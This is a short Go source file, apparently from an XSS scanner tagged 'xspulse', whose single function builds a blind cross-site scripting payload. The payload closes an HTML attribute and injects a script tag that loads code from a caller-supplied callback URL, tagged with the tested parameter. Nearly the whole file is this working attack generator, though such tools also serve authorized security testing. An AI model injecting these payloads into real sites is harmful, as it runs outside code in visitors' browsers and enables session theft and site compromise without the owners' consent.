package scan

import (
	"fmt"
	"net/url"
	"strings"
)

func BuildBlindPayload(callbackURL, param string) string {
	callbackURL = strings.TrimSpace(callbackURL)
	if callbackURL == "" {
		return ""
	}
	u, err := url.Parse(callbackURL)
	if err != nil {
		return ""
	}
	q := u.Query()
	q.Set("source", "xspulse")
	if strings.TrimSpace(param) != "" {
		q.Set("param", param)
	}
	u.RawQuery = q.Encode()
	return fmt.Sprintf(`"><script src=%q></script>`, u.String())
}
